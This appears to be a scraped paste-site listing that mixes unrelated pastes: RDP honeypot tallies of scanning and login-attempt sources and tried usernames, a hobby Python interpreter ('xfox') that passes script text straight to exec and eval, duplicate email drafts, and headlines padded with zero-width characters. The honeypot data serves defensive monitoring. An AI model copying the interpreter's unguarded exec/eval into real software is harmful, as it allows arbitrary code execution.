    ""w5zsc54b"": 12,
    ""(empty)"": 6,
    ""RcjDaNVqe"": 3,
    ""hOaUmq"": 3,
    ""fPYesr"": 3,
    ""Domain"": 12,
    ""vlHJdCQLz"": 3,
    ""XpYWBq"": 3,
    ""cbcAlo"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""BbArRsQkw"": 3,
    ""WpAirB"": 3,
    ""IfCFzw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 744
  },
  ""client_build"": {
    ""Unknown"": 744
  },
  ""client_name"": {
    ""Unknown"": 744
  },
  ""ip_type"": {
    ""hosting & proxy"": 462,
    ""hosting"": 57,
    ""Unknown"": 126,
    ""proxy"": 33,
    ""mobile & proxy"": 66
  }
}"
nsNYPcvH,2025-03-24_stats.json,rdp_snitch,JSON,Monday 24th of March 2025 07:16:12 PM CDT,"{
  ""ip"": {
    ""106.14.144.233"": 290,
    ""165.22.186.232"": 8,
    ""139.177.201.148"": 2,
    ""103.37.60.27"": 22,
    ""185.42.12.5"": 12,
    ""147.185.132.9"": 6,
    ""165.227.22.50"": 8,
    ""157.245.226.238"": 2,
    ""66.228.42.15"": 2,
    ""45.227.254.152"": 8,
    ""199.45.155.76"": 2,
    ""178.63.252.130"": 2,
    ""147.185.132.213"": 6,
    ""172.232.225.185"": 4,
    ""178.20.129.235"": 2,
    ""14.225.198.240"": 2,
    ""162.142.125.195"": 2,
    ""58.218.199.219"": 10,
    ""205.210.31.232"": 6,
    ""220.117.78.210"": 44,
    ""165.154.182.72"": 2,
    ""185.242.226.23"": 2,
    ""216.24.216.245"": 44,
    ""157.245.104.150"": 2,
    ""198.235.24.68"": 6
  },
  ""asn"": {
    ""AS37963"": 290,
    ""AS14061"": 20,
    ""AS63949"": 8,
    ""AS149147"": 22,
    ""AS59425"": 12,
    ""AS396982"": 24,
    ""AS267784"": 8,
    ""AS398722"": 2,
    ""AS24940"": 2,
    ""AS24810"": 2,
    ""AS135905"": 2,
    ""AS398324"": 2,
    ""AS4134"": 10,
    ""AS4766"": 44,
    ""AS135377"": 2,
    ""AS202425"": 2,
    ""AS174"": 44
  },
  ""isp"": {
    ""Hangzhou Alibaba Advertising Co"": 290,
    ""DigitalOcean, LLC"": 20,
    ""Akamai Technologies, Inc."": 8,
    ""Gofiber Software Technology Company Limited"": 22,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 8,
    ""Censys, Inc."": 4,
    ""Hetzner Online GmbH"": 2,
    ""Teleset LLC Nchelny Branch"": 2,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""Chinanet"": 10,
    ""Korea Telecom"": 44,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""IP Volume inc"": 2,
    ""Ipxo LLC"": 44
  },
  ""org"": {
    ""Aliyun Computing Co., LTD"": 290,
    ""DigitalOcean, LLC"": 20,
    ""Linode"": 4,
    ""GOFIBER-SOFTWARE"": 22,
    ""Horizon LLC"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""Xwin Universal LTD"": 8,
    ""Censys, Inc."": 2,
    ""Rasoul Shamaei"": 2,
    ""Akamai Technologies, Inc."": 4,
    ""Teleset LLC"": 2,
    ""VNPT"": 2,
    ""Censys Inc"": 2,
    ""Chinanet JS"": 10,
    ""Kornet"": 44,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""AI Spera"": 2,
    ""Unknown"": 44
  },
  ""regionName"": {
    ""Shanghai"": 290,
    ""New Jersey"": 10,
    ""Georgia"": 2,
    ""Ho Chi Minh"": 22,
    ""Moscow"": 12,
    ""California"": 36,
    ""Vilnius"": 8,
    ""Kowloon"": 2,
    ""Saxony"": 2,
    ""Jakarta"": 4,
    ""Tatarstan Republic"": 2,
    ""Hanoi"": 2,
    ""Michigan"": 2,
    ""Jiangsu"": 10,
    ""Seoul"": 44,
    ""North Holland"": 2,
    ""North Rhine-Westphalia"": 44,
    ""Karnataka"": 2
  },
  ""country"": {
    ""China"": 300,
    ""United States"": 50,
    ""Vietnam"": 24,
    ""Russia"": 14,
    ""Lithuania"": 8,
    ""Hong Kong"": 2,
    ""Germany"": 46,
    ""Indonesia"": 4,
    ""South Korea"": 44,
    ""The Netherlands"": 2,
    ""India"": 2
  },
  ""account"": {
    ""hello"": 422,
    ""u6g5liub"": 8,
    ""beio"": 6,
    ""Test"": 12,
    ""FCLbxsYoI"": 2,
    ""lNqSCx"": 2,
    ""pvGnBp"": 2,
    ""w5zsc54b"": 8,
    ""(empty)"": 4,
    ""RcjDaNVqe"": 2,
    ""hOaUmq"": 2,
    ""fPYesr"": 2,
    ""Domain"": 8,
    ""vlHJdCQLz"": 2,
    ""XpYWBq"": 2,
    ""cbcAlo"": 2,
    ""Administrator"": 2,
    ""nmap"": 2,
    ""BbArRsQkw"": 2,
    ""WpAirB"": 2,
    ""IfCFzw"": 2
  },
  ""keyboard"": {
    ""Unknown"": 496
  },
  ""client_build"": {
    ""Unknown"": 496
  },
  ""client_name"": {
    ""Unknown"": 496
  },
  ""ip_type"": {
    ""hosting & proxy"": 308,
    ""hosting"": 38,
    ""Unknown"": 84,
    ""proxy"": 22,
    ""mobile & proxy"": 44
  }
}"
LL3LEvfq,2025-03-24_stats.json,rdp_snitch,JSON,Monday 24th of March 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""106.14.144.233"": 145,
    ""165.22.186.232"": 4,
    ""139.177.201.148"": 1,
    ""103.37.60.27"": 11,
    ""185.42.12.5"": 6,
    ""147.185.132.9"": 3,
    ""165.227.22.50"": 4,
    ""157.245.226.238"": 1,
    ""66.228.42.15"": 1,
    ""45.227.254.152"": 4,
    ""199.45.155.76"": 1,
    ""178.63.252.130"": 1,
    ""147.185.132.213"": 3,
    ""172.232.225.185"": 2,
    ""178.20.129.235"": 1,
    ""14.225.198.240"": 1,
    ""162.142.125.195"": 1,
    ""58.218.199.219"": 5,
    ""205.210.31.232"": 3,
    ""220.117.78.210"": 22,
    ""165.154.182.72"": 1,
    ""185.242.226.23"": 1,
    ""216.24.216.245"": 22,
    ""157.245.104.150"": 1,
    ""198.235.24.68"": 3
  },
  ""asn"": {
    ""AS37963"": 145,
    ""AS14061"": 10,
    ""AS63949"": 4,
    ""AS149147"": 11,
    ""AS59425"": 6,
    ""AS396982"": 12,
    ""AS267784"": 4,
    ""AS398722"": 1,
    ""AS24940"": 1,
    ""AS24810"": 1,
    ""AS135905"": 1,
    ""AS398324"": 1,
    ""AS4134"": 5,
    ""AS4766"": 22,
    ""AS135377"": 1,
    ""AS202425"": 1,
    ""AS174"": 22
  },
  ""isp"": {
    ""Hangzhou Alibaba Advertising Co"": 145,
    ""DigitalOcean, LLC"": 10,
    ""Akamai Technologies, Inc."": 4,
    ""Gofiber Software Technology Company Limited"": 11,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 4,
    ""Censys, Inc."": 2,
    ""Hetzner Online GmbH"": 1,
    ""Teleset LLC Nchelny Branch"": 1,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""Chinanet"": 5,
    ""Korea Telecom"": 22,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""IP Volume inc"": 1,
    ""Ipxo LLC"": 22
  },
  ""org"": {
    ""Aliyun Computing Co., LTD"": 145,
    ""DigitalOcean, LLC"": 10,
    ""Linode"": 2,
    ""GOFIBER-SOFTWARE"": 11,
    ""Horizon LLC"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""Xwin Universal LTD"": 4,
    ""Censys, Inc."": 1,
    ""Rasoul Shamaei"": 1,
    ""Akamai Technologies, Inc."": 2,
    ""Teleset LLC"": 1,
    ""VNPT"": 1,
    ""Censys Inc"": 1,
    ""Chinanet JS"": 5,
    ""Kornet"": 22,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""AI Spera"": 1,
    ""Unknown"": 22
  },
  ""regionName"": {
    ""Shanghai"": 145,
    ""New Jersey"": 5,
    ""Georgia"": 1,
    ""Ho Chi Minh"": 11,
    ""Moscow"": 6,
    ""California"": 18,
    ""Vilnius"": 4,
    ""Kowloon"": 1,
    ""Saxony"": 1,
    ""Jakarta"": 2,
    ""Tatarstan Republic"": 1,
    ""Hanoi"": 1,
    ""Michigan"": 1,
    ""Jiangsu"": 5,
    ""Seoul"": 22,
    ""North Holland"": 1,
    ""North Rhine-Westphalia"": 22,
    ""Karnataka"": 1
  },
  ""country"": {
    ""China"": 150,
    ""United States"": 25,
    ""Vietnam"": 12,
    ""Russia"": 7,
    ""Lithuania"": 4,
    ""Hong Kong"": 1,
    ""Germany"": 23,
    ""Indonesia"": 2,
    ""South Korea"": 22,
    ""The Netherlands"": 1,
    ""India"": 1
  },
  ""account"": {
    ""hello"": 211,
    ""u6g5liub"": 4,
    ""beio"": 3,
    ""Test"": 6,
    ""FCLbxsYoI"": 1,
    ""lNqSCx"": 1,
    ""pvGnBp"": 1,
    ""w5zsc54b"": 4,
    ""(empty)"": 2,
    ""RcjDaNVqe"": 1,
    ""hOaUmq"": 1,
    ""fPYesr"": 1,
    ""Domain"": 4,
    ""vlHJdCQLz"": 1,
    ""XpYWBq"": 1,
    ""cbcAlo"": 1,
    ""Administrator"": 1,
    ""nmap"": 1,
    ""BbArRsQkw"": 1,
    ""WpAirB"": 1,
    ""IfCFzw"": 1
  },
  ""keyboard"": {
    ""Unknown"": 248
  },
  ""client_build"": {
    ""Unknown"": 248
  },
  ""client_name"": {
    ""Unknown"": 248
  },
  ""ip_type"": {
    ""hosting & proxy"": 154,
    ""hosting"": 19,
    ""Unknown"": 42,
    ""proxy"": 11,
    ""mobile & proxy"": 22
  }
}"
PEpXMRYU,Untitled,quab,Python,Monday 24th of March 2025 06:05:16 PM CDT,"__main__.py:
import xfox
import sys,asyncio
try:
    from termcolor import colored
except:
    def colored(a,b):
        return a
def main():
    global argv
    argv=sys.argv[1:]
    try:
        match argv[0]:
            case ""-p"":
                try:
                    return asyncio.run(xfox.parse(""\n"".join(argv[1:])))
                except xfox.Raise as e:
                    print(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))
            case _:
                try:
                    with open(argv[0], ""r"") as f:
                        return asyncio.run(xfox.parse(""\n"".join(f.readlines())))
                except FileNotFoundError as e:
                    print(colored(f""[ERROR] File {argv[0]} not found"",""red""))
                except xfox.Raise as e:
                    print(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))
    except IndexError:
        print(""Atterlity-xfox ""+xfox.VERSION)
        print(""Its just a compiller... Type something.."")
        while True:
            try:
                a=input("">>> "")
            except KeyboardInterrupt:
                return 0
            try:
                print(asyncio.run(xfox.parse(a)))
            except xfox.Raise as e:
                print(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))

main()"
FnNyiq3Z,Untitled,quab,Python,Monday 24th of March 2025 06:04:49 PM CDT,"__init__.py:

# Говнокод от (меня)
import re,asyncio,inspect,json,io,contextlib,traceback,math,importlib,random,time
import nest_asyncio,uuid
try:
    from termcolor import colored
except:
    def colored(a,b):
        return a

class funcs:
    def __init__(self) -> None:
        pass
class anonfuncs:
    def __init__(self) -> None:
        pass
class CacheData:
    pass
class AnonFunction:
    def __init__(self,name,code):
        self.name=name
        self.__code=code
    async def compile(self):
        return await parse(self.__code)
VERSION=""0.1.7""
cache=CacheData()
class StopWord(Exception):
    def __init__(self, text):
        super().__init__(text)
class Empty(Exception):
    def __init__(self, text):
        super().__init__(text)
class OnlyIf(Exception):
    def __init__(self, text):
        super().__init__(text)
class WrongAnnotation(Exception):
    def __init__(self, text):
        super().__init__(text)
class Raise(Exception):
    def __init__(self, text):
        super().__init__(text)

DNTl=[""xfexec"",'try','if','for','def','while',""dowhile""]
output_rep={""&i"":'$',""&j"":""&"",""&k"":';',""&s"":'//'}

async def isempty(item, count=-1):
    fname=traceback.extract_stack()[-2][2]
    fvar=list(inspect.currentframe().f_back.f_locals.items())
    if item == '': raise Empty(f""Mising var {fvar[0][0]} in {fname}"")
    elif len(item)<count or count!=-1: raise Empty(f""Mising vars in {fname}"")
    return False

def isindclass(a,b):
    if a is b:
        return True
    else:
        return False

def classreturn(self):
    return f""<Class {self.name}>""

def addfunc(clas, name=None):
    def wrapper(func):
        if name == None:
            setattr(clas, func.__name__.lower(), func)
            return func
        setattr(clas, name.lower(), func)
        return func
    return wrapper

@addfunc(funcs, 'exec')
async def pyexec(back:bool,*args, **kwargs):
    ""Allows to execute python code.""
    str_obj = io.StringIO()
    nest_asyncio.apply()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        with contextlib.redirect_stdout(str_obj):
            async def execd():
                exec(args[0])
            loop.run_until_complete(execd())
            loop.close()
    except Exception as e:
        return e
    ret=str_obj.getvalue()
    str_obj.close()
    if back:
        return ret
    else: return """"

@addfunc(funcs, 'help')
async def phelp(name: str,*args, **kwargs):
    ""Allows you to find out the docstring and arguments of a function.""
    a=getattr(funcs, name)
    if a.__doc__ == None or a.__doc__ == '':
        return ""The function haven't docstring""
    else:
        return a.__doc__

@addfunc(funcs, 'break')
async def pbreak(*args, **kwargs):
    ""Why?""
    raise StopWord(""Break outside the cycle"")

@addfunc(funcs, 'raise')
async def praise(error:str,text:str,*args, **kwargs):
    ""Allows you to raise errors.""
    raise Raise({""name"":error,""text"":text})

@addfunc(funcs, 'input')
async def pinput(text: str, *args, **kwargs):
    ""Get user input from console.""
    return input(text)

@addfunc(funcs, 'print')
async def console(*args, **kwargs):
    ""Allows you to send a log message to the console.""
    print(colored(""[LOG] ""+'\n'.join(args),""yellow""))
    return ''

@addfunc(funcs, 'xfexec')
async def xfexec(back:bool,*args, **kwargs):
    ""Allows you working with xfox from code.""
    try:
        a = await __parse_code(args[0], **kwargs)
    except Exception as e:
        return e
    if back == True:
        return a

@addfunc(funcs, 'onlyif')
async def onlyif(item: str, message: str, *args, **kwargs):
    ""Checks the statement and throws an error, if False..""
    if eval(item):
        return """"
    else:
        raise OnlyIf(message)
    
@addfunc(funcs, 'import')
async def importt(item:str, *args, **kwargs):
    ""Just... import...""
    importlib.import_module(item, package=None)
    return ''
        
    
@addfunc(funcs, 'eval')
async def mathh(item:str, *args, **kwargs):
    ""Just... eval...""
    return eval(item)

@addfunc(funcs, 'let')
async def let(name:str, value, *args, **kwargs):
    ""Allows you to store data.""
    setattr(cache, name, value)
    return """"
@addfunc(funcs, 'get')
async def get(name:str, *args, **kwargs):
    ""Allows you to get data from storage.""
    return getattr(cache, name)

@addfunc(funcs, 'try')
async def xftry(onerror:str, *args, **kwargs):
    ""Just... 'try' from python...""
    try:
        return await __parse_code(args[0], **kwargs)
    except Exception as e:
        await let(""_"",e)
        return onerror
    
@addfunc(funcs, 'random')
async def xfrandom(x:int, y:int, *args, **kwargs):
    ""Allows  to get random number from X to Y""
    return random.randint(x,y)

@addfunc(funcs, ""if"")
async def xfif(*args, **kwargs):
    ""Just... 'if' from python...""
    if len(args)%2==0:
        for i in range(0,len(args),2):
            if eval(await parse(args[i],in_cycle=True, **kwargs)):
                return await parse(args[i+1],in_cycle=True, **kwargs)
    elif len(args)%2==1:
        for i in range(0,len(args[:-1]),2):
            if eval(await parse(args[i],in_cycle=True, **kwargs)):
                return await parse(args[i+1],in_cycle=True, **kwargs)
        else:
            return await parse(args[::-1][0],in_cycle=True, **kwargs)

@addfunc(funcs, ""while"")
async def xfwhile(q, code:str,*args, **kwargs):
    ""Just... 'while' from python...""
    trash=''
    while eval(await parse(q,in_cycle=True,**kwargs)):
        try:
            a=await parse(code, stop_word=True,in_cycle=True, **kwargs)
        except StopWord:
                break
        trash=trash+a
    return trash

@addfunc(funcs, ""dowhile"")
async def xfdowhile(q, code:str,*args, **kwargs):
    ""do 'do' and check 'while'. If 'while'=True continue doing 'do'""
    trash=await parse(code, stop_word=True,in_cycle=True, **kwargs)
    while eval(await parse(q,in_cycle=True,**kwargs)):
        try:
            a=await parse(code, stop_word=True,in_cycle=True, **kwargs)
        except StopWord:
                break
        trash=trash+a
    return trash


@addfunc(funcs, ""for"")
async def xffor(item, code:str,*args, **kwargs):
    ""Just... 'for' from python...""
    item=await parse(item, **kwargs)
    trash=''
    try:
        for i,j in dict(json.loads(item)).items():
            await let(""i"",i)
            await let(""j"",j)
            try:
                trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
            except StopWord:
                break
        return trash
    except TypeError as e:
        if e.args[0]==""cannot convert dictionary update sequence element #0 to a sequence"":
            for i in list(json.loads(item)):
                await let(""i"",i)
                try:
                    trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
                except StopWord:
                    break
            return trash
    except: pass
    if len(item.split(""..""))>1:
        a=item.split("".."")
        for i in range(int(a[0]),int(a[1])+1):
            await let(""i"",i)
            try:
                trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
            except StopWord:
                break
        return trash
    else:
        for i in range(int(item)):
            await let(""i"",i)
            try:
                trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
            except StopWord:
                break
        return trash
                
@addfunc(funcs, ""len"")
async def xflen(item,*args, **kwargs):
    ""Allows to get string lenght.""
    try:
        return len(dict(json.loads(item)).items())
    except TypeError as e:
        if e.args[0]==""cannot convert dictionary update sequence element #0 to a sequence"":
            return len(list(json.loads(item)))
        else: return len(item)

@addfunc(funcs, ""reverse"")
async def xfreverse(item:str,*args, **kwargs):
    ""Allows to get reversed string.""
    try:
        return list(json.loads(item))[::-1]
    except TypeError as e:
        return item[::-1]

@addfunc(funcs, ""round"")
async def xfround(item:float,col:int=0,*args, **kwargs):
    ""Allows to get round number.""
    if col == 0:
        return int(round(item,col))
    else:
        return round(item,col)

@addfunc(funcs, ""lower"")
async def xflower(item:str,*args, **kwargs):
    ""Allows to get lowercase string.""
    return item.lower()

@addfunc(funcs, ""exit"")
async def pyexit(*args, **kwargs):
    ""Just... 'exit' from python...""
    exit()

@addfunc(funcs, ""upper"")
async def xfupper(item:str,*args, **kwargs):
    ""Allows to get uppercase string.""
    return item.upper()

@addfunc(funcs, ""randomtextlist"")
async def xfrandomtext(item:list,col:int=1,*args, **kwargs):
    ""Allows to get random text from list.""
    return random.choices(item,k=col)

@addfunc(funcs, ""randomtext"")
async def xfrandomtext(col:int=1, *args, **kwargs):
    ""Allows to get random text from args.""
    return random.choices(args[:-1],k=col)

@addfunc(funcs, ""time"")
async def xftimestamp(*args, **kwargs):
    ""Allows to get timestamp.""
    return time.time()

@addfunc(funcs, ""fetch"")
async def xffetch(item:str,name:str=None,*args, **kwargs):
    ""Fetching data and store in storage.""
    if name == None:
        await let(""_"",json.loads(item))
        return ""$get[_]""
    else: 
        await let(name,json.loads(item))
        return f""$get[{name}]""

@addfunc(funcs, ""def"")
async def deffunc(code:str, name:str=None,*args, **kwargs):
    ""Allows to create anonymous (or not) function.""
    if name == None:
        name=str(uuid.uuid4())[:6]
        await let(name,code)
        return f""<Function {name}>""
    else:
        @addfunc(anonfuncs, name)
        async def anonf(*args,**kwargs):
            return await parse(code)
        return ''
#parser
async def parse_argument(arg):
    return re.sub(r""(?<!\\)\;"", '%#*()', arg).replace(""\\"",'').split('%#*()')
async def parse_argument_DNT(arg:str):
    code=arg
    while True:
            enn=re.search(r'\$(\w+)\[',code.lower())
            if enn==None:
                break
            en_s=enn.start()
            if int(en_s)>len(code):
                break
            en_e=enn.end()
            en=enn.end()
            ens=1
            function=code[en_s:en_e][1:-1].lower()
            if hasattr(funcs,function) or hasattr(anonfuncs,function):
                try:
                    while ens>0:
                        if code[en]==""["":
                            ens+=1
                        elif code[en]==']':
                            ens-=1
                        elif en>len(code):
                            raise AttributeError(""error"")
                        en+=1
                except IndexError:
                    raise IndexError(f""Out of range in '{function}'"")
            code=code.replace(code[en_s:en],'&i'+code[en_s:en][1:].replace("";"",'\\;'),1)
    return re.sub(r""(?<!\\)\;"", '%#*()', code).replace(""\\"",'').replace(""&i"",'$').split('%#*()')
async def __parse_code(code: str, stop_word:bool=False, in_cycle:bool=False, **kwargs):
    try:
        while True:
            enn=re.search(r'\$(\w+)\[',code.lower())
            en_s=enn.start()
            if int(en_s)>len(code):
                raise AttributeError(""ERROR"")
            en_e=enn.end()
            en=enn.end()
            ens=1
            function=code[en_s:en_e][1:-1].lower()
            if hasattr(funcs,function) or hasattr(anonfuncs,function):
                try:
                    while ens>0:
                        if code[en]==""["":
                            ens+=1
                        elif code[en]==']':
                            ens-=1
                        elif en>len(code):
                            raise AttributeError(""error"")
                        en+=1
                except IndexError:
                    raise IndexError(f""Out of range in '{function}'"")
                argument=code[en_e:en][:-1]
                if function in DNTl:
                    argument=await parse_argument_DNT(argument)
                elif argument=='': argument=['']
                else:
                    argument=await parse_argument(await __parse_code(argument,in_cycle=in_cycle, **kwargs))
                if hasattr(funcs,function):
                    fun=getattr(funcs, function)
                elif hasattr(anonfuncs,function):
                    fun=getattr(anonfuncs, function)
                insp=inspect.getfullargspec(fun).args
                insp_l=len(insp)
                for i in insp:
                    if not inspect.signature(fun).parameters[i].default is inspect._empty:
                        insp_l-=1
                if len(argument) >= insp_l:
                    sgin=inspect.signature(fun)
                    for i,k in zip(insp,argument):
                        isdnsd=sgin.parameters[i].annotation
                        if isindclass(isdnsd, str) or isindclass(isdnsd, inspect._empty):
                            if k == '':
                                raise Empty(f""Mising var {i} in {fun.__name__}"")
                        elif isindclass(isdnsd, AnonFunction):
                            x=re.search(r""<Function (\w+)>"", k)
                            if x:
                                argument[argument.index(k)]=AnonFunction(x.groups()[0],await get(x.groups()[0]))
                            else:
                                raise Empty(f""Mising var {i} in {fun.__name__}"")
                        elif isindclass(isdnsd, int):   
                            if k.isdigit():
                                argument[argument.index(k)]=int(k)
                            else:
                                if k.count('.') == 1:
                                    s = k.replace('.', '')
                                    if s.isdigit():
                                        argument[argument.index(k)]=int(k)
                                    else:
                                        raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                                else:
                                    raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        elif isindclass(isdnsd, float):
                            try:
                                argument[argument.index(k)]=float(k)
                            except: raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        elif isindclass(isdnsd, list) or isindclass(isdnsd, dict):
                            try: argument[argument.index(k)]=json.loads(k)
                            except: raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        elif isindclass(isdnsd, bool):
                            if k.lower()==""true"":
                                argument[argument.index(k)]=True
                            elif k.lower()==""false"":
                                argument[argument.index(k)]=False
                            else:
                                raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        else:
                            raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                    output=''
                    try:
                        output=await fun(*argument,**kwargs)
                    except StopWord:
                        if stop_word==True or in_cycle == True:
                            raise StopWord(""0_0"")
                    code=code.replace(code[en_s:en], str(output),1)
                else:
                    raise Empty(f""Mising var {insp[len(argument)]} in {fun.__name__}"")
            else:
                code=re.sub(r""\$(\w+)\["", ""&i""+code[en_s+1:en].replace("";"",'&k'),code,count=1)
    except AttributeError as e:
        pass
    except OnlyIf as e:
        return e.args[0]
    except Raise as e:
        raise Raise(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))
    return code.strip()
async def parse(code: str,del_empty_lines:bool=False,clear_output:bool=True,stop_word:bool=False,in_cycle:bool=False,**kwargs):
    ""Parser for xfox code!""
    output=await __parse_code(re.sub('\/\/.*?\/\/', '', code, flags=re.DOTALL),stop_word=stop_word,in_cycle=in_cycle,**kwargs)
    output=output.strip()
    if clear_output:
        for i,j in output_rep.items():
            output=re.sub(i,j,output)
        output=output
    if del_empty_lines:
        output='\n'.join([line for line in output.splitlines() if line.strip() != ''])
    return output"
gMU7DQba,email_correct,Uno2K,Python,Monday 24th of March 2025 05:17:02 PM CDT,"</first_email>
Hi Team,
 
I wanted to touch base regarding Google's Client-Side API. This API is a powerful tool for integrating Google's services directly into our web applications.
 
Here are the key points:
- It allows for seamless interaction with Google's services.
- Enhances user experience by providing direct access to features such as Google Maps, YouTube, and more.
- Reduces server load by handling requests on the client side.
 
We should explore how we can leverage this API in our current projects to improve functionality and performance.
 
Let me know if you have any questions or need further details.
 
Best,  
Bruno Lago
</first_email>

<second_email>
Hi Bruno,
 
Thanks for the update on Google's Client-Side API. This sounds like a great opportunity to enhance our web applications.
 
A few things come to mind:
- We should identify which current projects could benefit the most from this API.
- It might be useful to run some preliminary tests to understand the integration process and any potential challenges.
- We should also consider the security implications of handling requests on the client side.
 
I'll start looking into the documentation and see how we can get started. If anyone has specific projects in mind or needs further details, let's discuss.
 
Best regards,
Bruno Lago
</second_email>"
bDnJZw5h,email_example,Uno2K,Python,Monday 24th of March 2025 05:14:41 PM CDT,"</first_email>
Hi Team,
 
I wanted to touch base regarding Google's Client-Side API. This API is a powerful tool for integrating Google's services directly into our web applications.
 
Here are the key points:
- It allows for seamless interaction with Google's services.
- Enhances user experience by providing direct access to features such as Google Maps, YouTube, and more.
- Reduces server load by handling requests on the client side.
 
We should explore how we can leverage this API in our current projects to improve functionality and performance.
 
Let me know if you have any questions or need further details.
 
Best,  
Bruno Lago
</first_email>

<second_email>
Hi Bruno,
 
Thanks for the update on Google's Client-Side API. This sounds like a great opportunity to enhance our web applications.
 
A few things come to mind:
- We should identify which current projects could benefit the most from this API.
- It might be useful to run some preliminary tests to understand the integration process and any potential challenges.
- We should also consider the security implications of handling requests on the client side.
 
I'll start looking into the documentation and see how we can get started. If anyone has specific projects in mind or needs further details, let's discuss.
 
Best regards,
Bruno Lago
On 24 Mar 2025 at 18:55 -0300, Bruno Lago <brunolago@incorppar.com>, wrote:
Hi Team,
 
I wanted to touch base regarding Google's Client-Side API. This API is a powerful tool for integrating Google's services directly into our web applications.
 
Here are the key points:
- It allows for seamless interaction with Google's services.
- Enhances user experience by providing direct access to features such as Google Maps, YouTube, and more.
- Reduces server load by handling requests on the client side.
 
We should explore how we can leverage this API in our current projects to improve functionality and performance.
 
Let me know if you have any questions or need further details.
 
Best,  
Bruno Lago
</second_email>"
JYwbDdFC,News March24 25,Newscaster_Ned,Email,Monday 24th of March 2025 05:10:58 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

G‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎!‎

T‎r‎u‎m‎p‎,‎ ‎H‎y‎u‎n‎d‎a‎i‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎C‎o‎m‎p‎a‎n‎y‎ ‎I‎s‎ ‎I‎n‎v‎e‎s‎t‎i‎n‎g‎ ‎$‎2‎1‎ ‎B‎i‎l‎l‎i‎o‎n‎ ‎i‎n‎ ‎U‎.‎S‎.‎
T‎r‎u‎m‎p‎ ‎E‎s‎t‎i‎m‎a‎t‎e‎s‎ ‎'‎$‎4‎ ‎T‎r‎i‎l‎l‎i‎o‎n‎ ‎W‎o‎r‎t‎h‎ ‎o‎f‎ ‎C‎o‎m‎p‎a‎n‎i‎e‎s‎'‎ ‎A‎r‎e‎ ‎'‎M‎o‎v‎i‎n‎g‎ ‎B‎a‎c‎k‎'‎ ‎t‎o‎ ‎U‎.‎S‎.‎
C‎N‎N‎ ‎C‎o‎m‎i‎c‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎I‎a‎n‎ ‎B‎l‎a‎c‎k‎ ‎S‎m‎e‎a‎r‎s‎ ‎D‎e‎c‎e‎a‎s‎e‎d‎ ‎F‎o‎r‎m‎e‎r‎ ‎R‎e‎p‎.‎ ‎M‎i‎a‎ ‎L‎o‎v‎e‎ ‎a‎s‎ ‎‘‎D‎E‎I‎ ‎C‎o‎
C‎h‎i‎n‎e‎s‎e‎ ‎C‎o‎p‎p‎e‎r‎ ‎M‎i‎n‎e‎ ‎C‎a‎u‎s‎e‎s‎ ‎G‎i‎a‎n‎t‎ ‎A‎c‎i‎d‎ ‎S‎p‎i‎l‎l‎ ‎i‎n‎ ‎Z‎a‎m‎b‎i‎a‎
U‎.‎S‎.‎-‎U‎k‎r‎a‎i‎n‎e‎-‎R‎u‎s‎s‎i‎a‎ ‎T‎a‎l‎k‎s‎ ‎B‎e‎g‎i‎n‎ ‎i‎n‎ ‎S‎a‎u‎d‎i‎ ‎A‎r‎a‎b‎i‎a‎
